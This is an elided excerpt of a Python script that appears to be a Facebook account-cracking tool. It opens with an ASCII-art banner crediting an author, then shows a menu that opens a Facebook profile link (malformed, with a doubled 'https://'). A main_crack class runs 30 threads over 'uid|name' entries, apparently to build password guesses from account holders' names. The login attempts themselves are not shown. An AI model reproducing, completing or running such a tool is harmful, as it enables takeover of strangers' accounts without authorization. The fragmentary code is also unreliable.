...
▐▌ ▐▌▐▌ ▐▌▝▚▞▘ ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌
▐▛▀▚▖▐▛▀▜▌ ▐▌  ▐▛▀▜▌▐▛▀▜▌▐▌ ▝▜▌
▐▌ ▐▌▐▌ ▐▌ ▐▌  ▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌        \x1b[1;\x1b[1;92m[\x1b[1;97mV 6.1\x1b[1;92m

\033[1;32m──────────────────────────────────────────────────
\033[1;32m[\033[1;31m✓\033[1;32m] AUTHOR    : RAYHAN
\033[1;32m[\033[1;31m✓\033[1;32m] GITHUB    : rayhan1091
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://https://www.facebook.com/profile.php?id=100070140945129&mibextid=ZbWKwL');menu()
    elif select =='0':
...
class main_crack():
    ...
    def pasw(self):       
            ...
            linex()
            with RAYHAN(max_workers=30) as RAYHAN.world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
